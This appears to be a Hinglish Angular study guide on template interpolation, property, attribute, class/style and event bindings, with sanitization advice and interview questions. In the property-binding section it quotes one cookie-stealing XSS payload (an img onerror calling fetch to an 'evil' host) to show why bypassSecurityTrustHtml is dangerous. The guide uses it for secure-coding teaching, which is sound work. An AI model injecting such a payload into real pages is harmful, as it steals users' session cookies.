Interpolation & Template Expressions

Covers: {{ }} ka compiled roop · textInterpolate1..8 · Expression language ki grammar · Safe navigation · Pipes · toString coercion · Sanitization

1. What is it?

Interpolation = {{ expression }} — component ki value ko text node mein daalna. Sabse pehli cheez jo koi Angular mein seekhta hai, aur sabse kam samjhi jaane wali. Kyunki ye "template mein variable print karna" nahi hai — ye ek compile-time se runtime tak ka pipeline hai: expression parse hota hai, ek Type Check Block mein type-check hota hai (Ch3 S5), ek specific instruction mein compile hota hai, aur runtime pe dirty-check ke saath DOM mein likha jaata hai.

2. Why do we need it?

Dynamic text ke bina UI static HTML hai. Alternatives the: string concatenation aur innerHTML (XSS ka darwaza), ya manual textContent assignment (imperative, sync karna tumhara kaam). Interpolation teen guarantees deta hai: (1) expression text ki tarah insert hoga, HTML ki tarah nahi (XSS-safe by default); (2) value badlegi toh DOM apne aap update hoga; (3) value nahi badli toh DOM ko chhua bhi nahi jaayega.

3. What problem does it solve?

  • XSS → interpolated value hamesha escaped text banti hai, kabhi markup nahi.
  • Manual DOM sync → declarative binding.
  • Redundant DOM writes → built-in memoization (pichli value se comparison).
  • Runtime typos → strictTemplates se compile-time errors.

9. Advanced Example — expression cost aur memoization

export class OrderListComponent {
  orders = input.required<readonly Order[]>();
  query = signal('');

  // ❌ Template mein: {{ getTotal() }}
  getTotal() {                                              // L1
    console.count('getTotal');
    return this.orders().reduce((s, o) => s + o.amount, 0);
  }

  // ❌ Template mein: {{ orders().filter(o => ...).length }}  — allowed nahi (arrow)
  // ❌ Getter bhi wahi problem: har CD cycle
  get filtered() { return this.orders().filter(...); }        // L2

  // ✅ computed — memoized + dependency-tracked
  protected total = computed(() =>                             // L3
    this.orders().reduce((s, o) => s + o.amount, 0)
  );
  protected visible = computed(() =>                           // L4
    this.orders().filter(o => o.id.includes(this.query()))
  );
}

10. Code Explanation — Line by Line

  • L1: Template se call hone pe ye har CD cycle mein chalega — Angular ko nahi pata ki result cache ho sakta hai. Interpolation ka memoization result pe hai, call pe nahi: function chalega, phir return value compare hogi. Yaani DOM write bach jaayega, par computation nahi.
  • L2: Getter bhi bilkul wahi hai — property access dikhta hai, function call hota hai. Zone app mein mousemove ke saath ye 60 baar/sec chalega, har row ke liye.
  • L3: computed() ka contract alag hai: wo apni dependencies (orders()) track karta hai. orders na badle toh function chalta hi nahi — cached value milti hai. Aur signal-based CD mein wo view ko dirty bhi nahi karta (Ch3 S8).
  • L4: Do dependencies (orders, query) — koi ek badle toh recompute, dono stable toh cached. Aur ye lazy hai: agar template ne visible() na padha (e.g. @if false hai), toh filter chalta hi nahi.
  • Deep point: Interpolation ka built-in memoization write ko bachata hai; computed() compute ko bachata hai. Dono alag layers hain aur dono chahiye. Interview mein ye distinction bolna sharp lagta hai.

11. Common Mistakes

Galtiyan
  • Template mein function/getter call — har CD cycle. computed().
  • Signal bina (): {{ user }} → function print. strictTemplates on rakho, wo pakad lega.
  • {{ obj }} se object print karne ki koshish → [object Object]. Debug ke liye {{ obj | json }}.
  • Global objects (Math, JSON, window) template mein — undefined. Component pe field expose karo (protected Math = Math — ya better, ek pipe/computed).
  • {{ a | b : c ? d : e }} jaisa dense expression — pipe precedence aur ternary mix confusing hai. Parentheses ya computed().
  • Interpolation ko markup samajhna: {{ '<b>hi</b>' }} literal text print karega — ye feature hai, bug nahi.
  • bypassSecurityTrustHtml() user content pe — direct XSS.

12. Best Practices

Production rules
  • Template mein sirf property access, signal calls, aur pipes. Har logic computed() mein.
  • strictTemplates: true — signal bina (), typos, null access sab compile pe pakde jaayenge.
  • Safe navigation (?.) + nullish (??) — *ngIf-wrapping se saaf.
  • Formatting = pure pipes (memoized) ya computed(). Kabhi {{ format(x) }}.
  • User content kabhi innerHTML mein nahi. Interpolation default rakho.
  • Ek interpolation ek expression: {{ a }}{{ b }} readable hai, {{ a + ' ' + b }} nahi.

13. Performance

Har interpolation ek binding slot (vars, Ch3 S6) + har CD cycle mein ek Object.is comparison. Comparison nano-cost hai. Do asli costs: (1) expression ka evaluation — function calls/getters yahan chhupte hain; (2) bindings ki count × instances: 20 bindings × 1000 rows = 20,000 evaluations per cycle.

textInterpolate1..8 ke alag-alag variants exist karne ka reason hi performance hai: fixed arity = koi array allocation, koi loop, V8 ke liye monomorphic call site. 9+ expressions pe textInterpolateV ek array banata hai — ek aur reason ki ek text node mein 9 expressions mat thooso; do nodes better.

14. Edge Cases

  • Interpolation delimiters (interpolation: ['[[', ']]']) component metadata mein customize ho sakte the — server-side templating clashes ke liye. Rare, aur naye code mein zaroorat nahi.
  • {{ }} attribute mein bhi chalta hai: <img src="{{ url }}"> — ye attribute interpolation hai aur property binding ([src]) ke barabar treat hoti hai, sanitization ke saath. Par mixed static+dynamic ke liye hi use karo.
  • $any(expr) — template ka as any (Ch2 S1). Type checking bypass. Comment ke saath, warna technical debt.
  • Pipes ke arguments bhi expressions hain: {{ x | slice:start:end }} — start/end bhi track hote hain.
  • Impure pipes (pure: false) har CD cycle mein chalte hain — async pipe impure hai (par uska apna change mechanism hai).
  • {{ }} ke andar newline/whitespace theek hai; compiler trim karta hai. Par template ka whitespace preservation preserveWhitespaces se controlled hai (default: remove).

15. Interview Questions

EASY Interpolation XSS se kaise bachata hai?

Interpolated value hamesha text node mein jaati hai (textContent), markup ki tarah parse nahi hoti. <img onerror=...> string print ho jaayega, execute nahi. XSS ka rasta [innerHTML] hai — wahan Angular sanitize karta hai (dangerous attributes hataata hai), aur bypassSecurityTrustHtml() se hi wo protection tootti hai.

EASY {{ getTotal() }} bura kyun hai?

Har change detection cycle mein execute hota hai — Angular ko nahi pata result cache-able hai. Interpolation ka memoization sirf DOM write bachata hai (result same hua toh DOM nahi chhuta), computation nahi. computed() dependency-tracked aur memoized hai: dependencies stable toh function chalta hi nahi.

MEDIUM {{ name }} compile hoke kya banta hai, aur usme dirty checking kahan hai?

δδtextInterpolate(ctx.name) — component ke update block mein. Instruction ke andar: LView ke binding slot se pichli value uthao, Object.is se compare karo, same hai toh return (DOM touch nahi), alag hai toh slot update karke textContent set karo. Yaani dirty checking generic tree-walk nahi, compiled code mein baked hai. Multiple expressions ke liye textInterpolate1..8 (fixed arity, no allocation) aur 9+ ke liye textInterpolateV (array).

MEDIUM Template expression language mein kya-kya allowed nahi hai aur kyun?

Assignment (event handlers chhod ke), new, ++/--, typeof/instanceof, bitwise | (kyunki | pipe hai), global scope (window, Math, JSON), arrow functions. Wajah: restricted grammar compiler ko har expression samajhne deti hai — isse Type Check Blocks (template type checking), targeted update instructions, aur baked-in dirty checking possible hote hain. Arbitrary JS hota toh runtime interpreter ship karna padta. Restriction ek design feature hai, limitation nahi.

HARD textInterpolate1 se textInterpolate8 tak alag functions kyun hain, sirf ek variadic kyun nahi?

Performance, V8 level pe. Fixed-arity function mein: (1) koi rest-args array allocate nahi hota (variadic version har call pe ek array banata — hot path mein 1000 rows × 60fps = GC pressure, Ch1 S8); (2) call site monomorphic rehta hai — V8 inline cache ek hi shape dekhta hai, inlining kar sakta hai; (3) loop nahi hai, straight-line code hai. textInterpolateV (variadic) 9+ expressions ke liye fallback hai, jahan itne bindings ho toh ek array allocation ka farak vaise bhi noise hai. Ye wahi philosophy hai jo poore Ivy mein hai (Ch3 S6): compile time pe jitna specialize kar sakte ho, karo; runtime pe generic code mat chalao. Aur practical takeaway: ek text node mein 9+ interpolations likhna literally alag (slower) code path pe le jaata hai.

SCENARIO Product ne kaha: comments mein bold/italic/links allow karo. User-generated content hai. Kaise implement karoge?

Sabse pehle: [innerHTML] + bypassSecurityTrustHtml = instant reject; wo XSS ka direct rasta hai. Options, safety order mein: (1) Structured content (best) — user input ko parse karke ek typed AST/segments array banao ({type: 'bold', text}, {type: 'link', href, text}), aur template mein @switch se render karo. Sab kuch interpolation se jaata hai, HTML kabhi nahi banti. Links pe apna validation (https:/mailto: allowlist, rel="noopener noreferrer"). Zero XSS surface. (2) Markdown + allowlist sanitizer — markdown-it se HTML, phir DOMPurify se allowlist-based sanitize (sirf b/i/a/code, aur a pe sirf href), phir [innerHTML]. Angular ka apna sanitizer bhi chalega (double defense). Trade-off: ek parsing library ka trust + bundle. (3) Server-side sanitization — store karte waqt sanitize karo, par client pe bhi karo (defense in depth; DB mein purana data ho sakta hai). Aur zaroori details jo interviewer sunna chahta hai: XSS context-dependent hai (HTML body vs attribute vs URL vs script), isliye ek "escape" function kaafi nahi; CSP header (script-src) ek doosri layer hai jo bypass hone pe bhi bachata hai; aur bypassSecurityTrust* ka koi bhi use code review mein security-owner approval maange. Recommendation: option 1 agar formatting set chhota hai (usually hai), warna option 2 + CSP.

Property Binding

Covers: [prop] ka compiled roop · DOM property vs HTML attribute · Input binding · Security contexts & sanitization · Unknown property errors

1. What is it?

Property binding = [prop]="expr" — expression ki value ko DOM element ki JavaScript property (ya component ke input()) mein set karna. Ye Angular ka sabse zyada use hone wala binding hai aur uska sabse zyada galat samjha jaane wala hissa: property attribute nahi hai.

2. Why do we need it?

HTML attributes initial values hain — wo markup mein likhe jaate hain aur parse ke waqt padhe jaate hain. Jo cheez baad mein badalti hai wo DOM property hai, ek live JavaScript object ki field. <input value="hi"> mein user ne type kiya toh input.value badal gaya, par attribute value="hi" wahi hai. Angular ko live state chahiye, isliye default property binding hai.

3. What problem does it solve?

  • String-only attributes → property binding koi bhi type pass kar sakti hai (object, array, function).
  • Stale initial values → live DOM state se bind.
  • Component inputs → same syntax se child ko typed data.
  • XSS via URLs/HTML → security-context-aware sanitization.

10. Code Explanation — Line by Line

  • L1: innerHTML ka security context HTML hai, toh compiler ne δδproperty('innerHTML', value, δδsanitizeHtml) emit kiya. Sanitizer har CD cycle mein chalta hai jab value badle — ye cost hai, isliye bade HTML blobs pe innerHTML ka repeated binding mehenga hai.
  • L2: bypassSecurityTrustHtml ek SafeHtml object return karta hai. Angular jab dekhta hai ki value ek SafeValue hai, wo sanitization skip kar deta hai. Naam mein "bypassSecurityTrust" isliye hai ki code review mein chubhe.
  • L3: Ab attacker ka <img src=x onerror=fetch('//evil?c='+document.cookie)> chalega. Ye ek line ka XSS hai, aur ye Angular apps mein sabse common security bug hai.
  • Kab bypass justified hai: jab tum khud HTML/URL construct kar rahe ho validated components se (upar wala YouTube example), ya trusted CMS content jo already server pe allowlist-sanitized hai. Rule: bypass ka argument kabhi user-controlled string nahi ho sakta. Aur CSP header (Ch5 S1 scenario) ek doosri layer hai jab ye discipline fail ho jaaye.

  • Static string binding: selected="false" — string "false" truthy hai. [selected]="false" ya transform: booleanAttribute.
  • [innerHTML] user content pe (sanitizer bhi bacha lega, par kyun risk lo) — aur bypassSecurityTrustHtml toh kabhi nahi.
  • Custom element (Web Component) pe binding aur CUSTOM_ELEMENTS_SCHEMA na dena — "not a known property" error. Ya galat: schema daal ke saare typos silence kar dena.
  • [ngClass]/[ngStyle] naye code mein — native [class]/[style] bindings tez hain (S4).
  • Object literal binding: [config]="{ a: 1 }" — har CD cycle mein naya reference, child hamesha dirty (Ch4 S5 performance).

12. Best Practices

Production rules
  • Default property binding; attr. sirf jab property exist na kare.
  • Boolean inputs pe transform: booleanAttribute — <app-x disabled> bhi kaam kare.
  • User content = interpolation. innerHTML sirf trusted/sanitized content pe.
  • bypassSecurityTrust* = security review + comment + validated construction. Lint rule se flag karo.
  • Template mein object/array literals mat banao — computed() mein.
  • strictTemplates on — unknown property aur type mismatch dono pakde jaayenge.

13. Performance

Har property binding = ek vars slot + ek Object.is comparison per CD cycle (Ch3 S6). Sanitization wale bindings ([innerHTML], [src]) mein comparison ke baad sanitizer chalta hai — value badalne pe hi, par bade HTML strings pe ye measurable hai (parse + traverse + serialize).

Component input bindings ka cost alag hai: comparison fail hone pa child ka subtree dirty hota hai. Isliye stable references critical hain — template mein [items]="orders().filter(...)" likhne se har cycle naya array, child hamesha re-render. computed() se stable reference milta hai jab tak dependencies na badlein.

14. Edge Cases

  • Attribute interpolation (src="{{ x }}") property binding ke barabar hai — lekin mixed static+dynamic ke liye hi. [src]="x" zyada explicit.
  • <svg> ke andar zyada tar cheezein attributes hain, properties nahi — [attr.width] chahiye (S3).
  • [style] aur [class] property bindings nahi hain — unka apna instruction set hai (S4).
  • [@animationTrigger] — animations ka special binding syntax, property nahi.
  • Two DOM properties jinke naam attribute se alag hain: class→className, for→htmlFor. Angular [class] ko special-case karta hai; [for] ke liye [attr.for] ya [htmlFor].
  • SafeValue objects (SafeHtml, SafeUrl) template mein interpolate karo toh "SafeValue must use [property]=binding" error — ye deliberate guard hai.
  • Dynamic components: componentRef.setInput() hi sahi rasta hai; instance property direct set karna CD ko trigger nahi karega.

EASY [value] aur [attr.value] mein farak?

[value] DOM property set karta hai — live state, jo user ke type karne pe badalti hai. [attr.value] HTML attribute set karta hai — initial/serialized value, jo baad mein DOM property ko affect nahi karti. Practically: input ki current value ke liye hamesha [value]. Attribute tab jab koi property hai hi nahi (colspan, aria-*, SVG).

EASY "Can't bind to 'x' since it isn't a known property of 'div'" — kyun aati hai?

Common causes: component ko imports mein add karna bhool gaye (Ch4 S2), input ka naam typo, ya Web Component use kar rahe ho (tab CUSTOM_ELEMENTS_SCHEMA chahiye). Ye error feature hai — typos runtime tak nahi pahunchte.

MEDIUM Angular ke security contexts kya hain aur RESOURCE_URL sabse strict kyun hai?

Paanch: HTML (innerHTML), STYLE, URL (href, src), RESOURCE_URL (iframe src, script src), NONE. Pehle teen mein Angular sanitize kar sakta hai (dangerous parts hata do). RESOURCE_URL mein sanitization possible hi nahi — kyunki wahan se browser code/content load karega, aur koi bhi URL syntactically safe dikh sakta hai par malicious content serve kar sakta hai. Isliye Angular bind karne hi nahi deta; bypassSecurityTrustResourceUrl() se explicit trust dena padta hai — aur wo tabhi safe hai jab URL tum validated pieces se khud construct kar rahe ho.

MEDIUM [innerHTML] mein Angular kya sanitize karta hai, aur wo kaafi hai kya?

HTML ko inert document mein parse karke allowlist ke against traverse karta hai: safe tags (p, b, a...) rakhta hai, dangerous tags (script) aur event handler attributes (onerror, onclick) hata deta hai. Ye default protection kaafi strong hai. Toot-ti tab hai jab koi bypassSecurityTrustHtml() lagata hai — jo user content pe kabhi justified nahi. Defense in depth ke liye: server-side sanitization + CSP header. Aur pehla sawaal hamesha ye ho ki kya innerHTML ki zaroorat hai hi — structured data + template rendering aksar behtar hai.

HARD [prop]="x" compile hone se pehle Angular kaunse do checks karta hai, aur unka order kyun matter karta hai?

Order: pehle directive/component inputs, phir DOM properties. Compiler element pe matched directives (uske imports se, Ch4 S2) ke inputs mein prop dhundhta hai; mila toh ye ek input binding hai (δδproperty input setter ko call karega, aur type check input ke declared type ke against hoga). Nahi mila toh lib.dom.d.ts se element ki known properties check karta hai; mila toh DOM property binding (security context ke saath). Dono nahi → compile error. Order isliye matter karta hai ki directive input DOM property ko shadow kar sakta hai: agar tum ek directive banao jiska input value hai aur use <input appMask [value]="x"> pe lagao, toh binding tumhari directive ko jaayegi, native value property ko nahi — aur DOM update ab tumhari zimmedari hai. Ye Angular Material aur form directives ka common pattern hai (ngModel apne value-jaisa flow control karta hai), par accidental shadowing ek confusing bug source bhi hai. Practical rule: directives ke input names ko prefix karo (Ch4 S2) taaki wo native properties se collide na karein.

SCENARIO Product ko YouTube aur Vimeo embeds chahiye, URL user (content editor) deta hai. Secure implementation design karo.

Naive: <iframe [src]="sanitizer.bypassSecurityTrustResourceUrl(userUrl)"> — ye ek open redirect/XSS ka darwaza hai (javascript:, ya attacker-controlled origin jo parent page pe postMessage se attack kare). Sahi design: (1) URL ko parse karo, use karo mat — new URL(userUrl), phir hostname ko strict allowlist se match karo (www.youtube.com, youtu.be, player.vimeo.com). Wildcard subdomain matching mat likho (endsWith('.youtube.com') → evil-youtube.com pass ho sakta hai agar dot bhool gaye). (2) ID extract karo, URL khud banao — user ki poori URL kabhi bypass mat karo. Video id ko regex se validate (/^[\w-]{11}$/), phir https://www.youtube.com/embed/${id} khud construct karo. Ab bypass ka argument tumhara constructed string hai, user ka input nahi. (3) bypassSecurityTrustResourceUrl ek hi jagah — ek EmbedService jisme validation + construction + trust ek saath hai, aur uska unit test malicious inputs se bhara ho. Poore codebase mein bypass ki dusri koi call na ho (lint rule). (4) iframe ko harden karo: sandbox="allow-scripts allow-same-origin" (jitna kam ho utna acha; note: dono saath dene se sandbox weak ho jaata hai — provider ki requirement dekho), referrerpolicy, loading="lazy", allow="encrypted-media" sirf zaroori features. (5) CSP: frame-src ko allowlisted origins tak seemit karo — code mein bug ho toh browser rok le. Ye "defense in depth" ka asli matlab hai. (6) Validation server pe bhi — client validation UX hai, security nahi. Interviewer jo sunna chahta hai: bypass ka justification "maine URL banayi hai", "URL safe dikhti hai" nahi.

S-03

Attribute Binding

Covers: [attr.x] ka compiled roop · null removes attribute · Boolean attribute trap · ARIA · SVG namespace · colspan / data-* · Security

1. What is it?

Attribute binding = [attr.name]="expr" — HTML attribute ko directly set/remove karna, DOM property ko bypass karke. Ye ek escape hatch hai, default nahi. Angular ise tab deta hai jab element ki koi matching DOM property hi na ho.

2. Why do we need it?

Kyunki HTML ki duniya mein bahut kuch aisa hai jiska JavaScript property equivalent nahi hai: colspan, aria-*, data-*, saare SVG attributes, aur kuch namespaced attributes. Agar Angular sirf property binding deta, toh accessibility likhna hi asambhav hota — <div [aria-label]="x"> compile error hai kyunki div pe koi aria-label property nahi hai (kuch modern browsers mein ARIA reflection aa rahi hai, par bharosemand nahi).

3. What problem does it solve?

  • Property-less attributes → ARIA, data-*, colspan, SVG.
  • Attribute removal → null bind karo, attribute DOM se hat jaata hai (property se possible nahi).
  • Namespaced attributes → SVG/XLink.
  • Server-rendered contracts → CSS attribute selectors, testing hooks (data-testid).

11. Common Mistakes

Galtiyan
  • [attr.disabled]="false" → element disabled ho jaata hai (attribute present). Property use karo, ya || null.
  • Ulta trap: [attr.aria-expanded]="open() || null" — aria-expanded="false" zaroori hai (enumerated attribute); usse hataoge toh screen reader ko pata nahi chalega ki collapsible hai. Boolean attributes (disabled, checked, hidden) aur enumerated ARIA attributes ko alag treat karo.
  • Har jagah [attr.] lagana "safe" samajh ke — property binding zyada correct aur type-checked hai.
  • SVG mein property binding try karna — [width] SVG pe kaam nahi karta, [attr.width] chahiye.
  • [attr.style] ya [attr.class] — ye [style]/[class] ke saath conflict karta hai aur poora attribute overwrite kar deta hai (S4).
  • [attr.href] ko "sanitization se bachne ka rasta" samajhna — nahi, security context wahin lagta hai.

12. Best Practices

Production rules
  • Default property binding; attr. tabhi jab property na ho (ARIA, data-*, SVG, colspan).
  • Boolean attribute chahiye toh expr || null pattern (null = remove).
  • Enumerated ARIA (aria-expanded, aria-checked, aria-pressed) mein "false" zaroori — || null mat lagao.
  • Visual state = data-* attribute + CSS attribute selector, inline styles nahi (bade lists mein bada win).
  • data-testid hooks se e2e tests ko CSS classes pe depend mat karwao.
  • Host bindings mein bhi wahi rules: host: { '[attr.aria-disabled]': 'disabled()' } (Ch4 S8).

13. Performance

Attribute binding property binding se thoda mehenga hai: setAttribute string conversion + attribute map update karta hai, jabki property assignment ek field write hai. Fark micro hai, par 20,000 cells × 4 attributes pe measurable ho sakta hai.

Bada lever wahi hai jo L3/L6 mein dekha: attribute + CSS vs inline style binding. Inline styles har element pe style attribute string banate hain (DOM memory + style recalc), jabki ek chhota data-* attribute + ek CSS rule browser ke optimized selector matching se guzarta hai. Aur agar value sirf N buckets leti hai (heatmap), toh N CSS rules infinite inline styles se behtar hain.

14. Edge Cases

  • SVG namespaced attributes: [attr.xlink:href] — Angular namespace handle karta hai (δδattribute namespace ke saath). Modern SVG mein href hi kaafi hai.
  • [attr.class] aur [class] ek saath → last-write-wins chaos. Kabhi mix mat karo.
  • Static attribute + binding same naam pe: <div id="a" [attr.id]="b"> — binding jeetti hai (update block creation ke baad chalta hai).
  • [attr.aria-label] ki value undefined ho toh attribute hat jaata hai — screen reader ke liye ye "koi label nahi", jo kabhi-kabhi aria-label="" se behtar hai.
  • data-* attributes DOM mein dataset se bhi readable hain — third-party libs (analytics) inhe padhti hain.
  • Attribute names case-insensitive hain HTML mein, par SVG/XML mein case-sensitive. [attr.viewBox] SVG mein sahi hai, viewbox nahi.

15. Interview Questions

EASY attr binding kab use karte hain?

Jab element ki koi matching DOM property na ho: ARIA attributes (aria-label), colspan, data-*, SVG attributes. Aur jab attribute ko hataana ho — null/undefined bind karne pe Angular removeAttribute call karta hai, jo property binding se possible nahi.

EASY [attr.disabled]="false" se kya hota hai?

MEDIUM SVG mein property binding kyun kaam nahi karti?

Isliye [width]="x" ya toh error deta hai ya kuch nahi karta; [attr.width]="x" chahiye. SVG XML hai, toh attribute names case-sensitive bhi hain (viewBox, viewbox nahi).

HARD [attr.href] aur [href] mein security ke hisaab se koi farak hai?

Nahi — dono pe wahi URL security context lagta hai aur Angular δδsanitizeUrl inject karta hai, jo javascript: URLs block karta hai. Ye jaan-boojh ke design kiya gaya: security context element + attribute name ke combination se determine hota hai, binding ke syntax se nahi. Warna [attr.href] ek trivial bypass ban jaata. Isi tarah <iframe [attr.src]> bhi RESOURCE_URL context mein hai aur error dega. Jo cheez sanitization skip karti hai wo sirf ek hai: value ka SafeValue hona (bypassSecurityTrust* se). Extension: attribute interpolation (href="{{ url }}") bhi same context se guzarti hai. Sabak: Angular ka sanitization sink-based hai (kahan value ja rahi hai), syntax-based nahi — aur yahi sahi design hai.

S-04

Class & Style Binding

Covers: classProp / styleProp / classMap / styleMap · Precedence algorithm · Unit suffixes · CSS custom properties · ngClass / ngStyle legacy · Static + dynamic merge

1. What is it?

Class aur style bindings ka apna alag instruction set hai — ye property bindings nahi hain (S2). Chaar roop hain:

  • [class.active]="isActive()" → class prop — ek class, on/off
  • [class]="'a b ' + x()" → class map — poora set (string/object/array)
  • [style.width.px]="w()" → style prop — ek property
  • [style]="styles()" → style map — poora set

Aur inke beech ek precisely-defined precedence algorithm hai — jo Angular ka sabse under-documented aur interview mein sabse differentiating topic hai.

2. Why do we need it?

Kyunki class aur style unique hain: ek hi attribute pe kai independent writers hote hain. Template bhi class lagana chahta hai, component ka apna host binding bhi (Ch4 S8), uspe lagi teen directives bhi, aur static markup bhi. Agar ye plain property binding hoti (el.className = x), toh har writer doosre ko mita deta. Isliye Angular ne inke liye ek merging system banaya hai, jo deterministic priority rules follow karta hai.

3. What problem does it solve?

  • Multiple writers ka conflict → deterministic precedence.

11. Common Mistakes

Galtiyan
  • [class] map mein inline object literal — har CD cycle mein naya reference, har baar diff. computed() se stable reference, ya [class.x] props.
  • Do sources ek class control kar rahe hain, aur precedence samjhe bina "kaam nahi kar raha" debug karna.
  • [ngClass] aur [class.x] mix karna — ngClass directive-host priority pe hai, template prop use override kar dega.
  • [attr.class] use karna — ye poora class attribute overwrite karta hai aur styling system ko bypass karta hai. Kabhi nahi.
  • [style.width]="w()" jahan w() number hai — CSS ko unit chahiye, kuch nahi lagega. [style.width.px].
  • Style bindings se theming — 20,000 inline styles. data-* + CSS (S3) ya CSS variables.
  • !important style binding mein — kaam karta hai ([style.color]="'red !important'") par ye CSS architecture ki haar hai.

12. Best Practices

Production rules
  • Prefer [class.x] / [style.prop] (prop bindings) over maps — sasta aur precedence mein upar.
  • Map zaroori ho toh computed() se stable reference.
  • Ek class = ek owner. Do sources hon toh do alag class names.
  • ngClass/ngStyle naye code mein nahi — native bindings.
  • Unit suffix syntax use karo (.px, .%, .rem) — string concat nahi.
  • Theming = CSS custom property binding ([style.--token]) ya data-* + CSS, per-element inline styles nahi.
  • null se style/class hataao (deterministic removal).

13. Performance

Cost ka order (sasta → mehenga): classProp < styleProp < classMap < styleMap < ngClass < ngStyle.

  • Prop bindings: ek Object.is + ek classList.toggle/style.setProperty. Practically free.
  • Map bindings: purane set se diff karna padta hai (kaunsi keys gayi/aayi). Aur agar reference har cycle badalta hai (inline literal), toh diff har baar chalega chahe content same ho.
  • ngClass: ek directive instance per element (LView slot + injector, Ch3 S6) + KeyValueDiffer object + ngDoCheck har cycle mein. 1000 rows pe ye 1000 extra directive instances hain.

Aur ek layer upar: inline styles browser ke style recalculation ko bhi mehenga karte hain — 20,000 elements pe unique style attributes vs 7 CSS rules ka farak Performance tab mein saaf dikhta hai (S3 ka heatmap lesson).

14. Edge Cases

  • Static class="a" + [class]="'b'" → dono lagti hain (a b). Par [class]="''" static ko nahi hataata — static hamesha base hai.
  • Do directives same class prop bind karein toh declaration order decide karta hai (baad wali jeetti) — undefined-ish behavior, kabhi rely mat karo.
  • [style.--var] CSS custom property binding — sanitization nahi lagti (custom props arbitrary strings hain); user input mat daalo.
  • [style] map string form mein sanitize hota hai (STYLE security context, S2).
  • Animations (@trigger) styles ko override kar sakti hain — wo alag renderer path se jaati hain.
  • classList.toggle ka matlab: Angular sirf apni bindings manage karta hai; agar tumne nativeElement.classList.add('x') se class lagayi, Angular use nahi hataayega (par map binding uska diff confuse kar sakta hai).

15. Interview Questions

EASY [class.active] aur [ngClass] mein kya farak?

[class.active] ek built-in instruction (δδclassProp) mein compile hoti hai — koi import, koi directive instance nahi. [ngClass] ek directive hai: har element pe instance + KeyValueDiffer + har CD cycle mein ngDoCheck. Native binding tez, chhoti, aur precedence mein upar hai. Naye code mein ngClass use nahi karna chahiye.

EASY [style.width]="42" kaam kyun nahi karta?

CSS ko unit chahiye; width: 42 invalid hai toh browser ignore kar deta hai. Do fix: [style.width.px]="42" (unit suffix syntax) ya [style.width]="42 + 'px'". Pehla saaf hai. Aur null bind karne pe style property remove ho jaati hai.

MEDIUM [class.x] aur [class] dono ek element pe hon toh kaun jeetega?

[class.x] (prop binding) jeetega — specificity axis pe prop > map. Logic: "maine specifically is class ke baare mein kaha" ka priority "maine ek bulk set diya" se zyada hai. Same rule styles pe: [style.color] > [style]. Static class="..." alag hai — wo base hai aur merge hoti hai.

MEDIUM Ek class ko component host aur template dono bind kar rahe hain — kaun jeetega?

Template. Source priority: template binding > directive host binding > component host binding. Practical implication: component apne host pe koi class default set kare, par consumer template mein use override kar sakta hai. Aur ek common bug: kisi ne template mein [class.disabled]="false" likh diya, ab koi directive us class ko kabhi laga nahi paayegi — silently.

HARD Angular ka styling precedence algorithm poora explain karo — dono axes ke saath.

Do independent axes hain jo milke deterministic winner nikalte hain. Axis 1 — specificity: prop binding ([class.x], [style.color]) > map binding ([class], [style]). Rationale: specific declaration bulk se zyada intentional hai. Axis 2 — source: template binding on the element > directive host binding > component host binding. Rationale: consumer (template) ko last word milna chahiye; component apne host pe defaults deta hai, directives beech mein. Static values (class="card") ek base layer hain jo dynamic bindings ke saath merge hoti hain (mitati nahi), par dynamic map static map ko override kar sakta hai. Multiple directives ke beech tie declaration/import order se toot-ti hai — jo deliberately unspecified-ish behavior hai, isliye uspe rely nahi karna. Implementation ke liye Angular ek per-element "styling context" rakhta hai jo har source ki value alag store karta hai, aur resolution ke waqt priority order mein pehla non-null value uthata hai — isiliye ek source ka null doosre source ki value ko "unmask" kar deta hai (removal ka semantic). Ye system isliye zaroori hai kyunki class/style hi wo do "attributes" hain jinke ek element pe kai independent writers hote hain; baaki har property ka ek hi writer hota hai. Practical rule jo isse nikalta hai: ek class ka ek hi owner rakho — do sources ek class control karein toh wo actually do alag concepts hain.

SCENARIO Design system ka <button appButton> hai. Product teams shikayat kar rahi hain: "kabhi-kabhi hamari custom class apply nahi hoti", "loading state dikhta nahi", "ngClass kaam nahi karta". Diagnose + fix.

Teeno shikayat ek hi root cause ki alag shakl hain: class ownership ka conflict + precedence ki na-samajhi. (1) "Custom class apply nahi hoti" — component host pe '[class]': "'btn btn--' + variant()" ek map binding hai. Map bindings apne set ko manage karti hain; consumer ki static class merge hogi, par agar consumer bhi [class] map use kare toh do maps ladenge (template jeetegi, component ki classes gayab). Fix: component host pe map ki jagah prop bindings ('[class.btn]': 'true', '[class.btn--primary]': "variant() === 'primary'") — ab merge saaf hai aur consumer ki classes safe. (2) "Loading state dikhta nahi" — appLoading directive host se [class.btn--disabled] laga rahi hai, par kisi template mein [class.btn--disabled]="false" likha hai (defensive coding), jo template-priority se jeet raha hai. Fix: alag class names (btn--loading vs btn--disabled) — do concepts, do owners. Aur design system ki classes ko consumer templates se bind karne se rokho (documentation + lint). (3) "ngClass kaam nahi karta" — ngClass directive-host priority pe hai, template ka [class.x] use override karta hai. Fix: ngClass ban karo (lint rule), native bindings use karo. (4) Systemic fix: (a) design system apni classes ko private maane — consumer ko styling ka contract CSS custom properties se do (Ch4 S4), classes se nahi; (b) variant/state ko input() se lo (variant, loading), classes ko component khud manage kare; (c) ek "styling contract" doc + Storybook; (d) precedence rules ko team ko padhao — ye ek line ka fix nahi, mental model ka gap hai. (5) Debugging tool: koi DevTools panel nahi batata "ye class kahan se aayi" — isliye reproduction ke liye chhota StackBlitz banao aur ek-ek source hataake dekho. Ye answer precedence + API design + governance teeno cover karta hai.

Event Binding

Covers: δδlistener internals · $event ka type · return false · Key modifiers · Global targets · Zone patching & coalescing · Propagation · Output vs DOM event

1. What is it?

Event binding = (event)="statement" — DOM event (ya component output()) pe ek statement chalana. Dhyan do: template expressions read-only hain (S1), par event binding mein statement hota hai — yahan assignment allowed hai, kyunki yahi wo jagah hai jahan state badalni hoti hai.

2. Why do we need it?

Unidirectional data flow ka doosra aadha: bindings data ko DOM tak le jaati hain, events user ki intent ko wapas laate hain. addEventListener se manually karne pe: cleanup tumhara kaam (Ch1 S8 leak), CD trigger tumhara kaam, aur template padh ke ye pata hi nahi chalta ki is button pe kya hota hai. Event binding declarative hai — markup mein hi dikhta hai ki kaun kis event pe react karta hai — aur lifecycle Angular manage karta hai.

3. What problem does it solve?

  • Listener leaks → component destroy pe automatic removal.
  • Manual CD trigger → Zone (ya signal writes) se automatic.
  • Cross-platform → Renderer ke through, SSR/Web Worker safe.
  • Keyboard boilerplate → pseudo-events (keydown.enter).

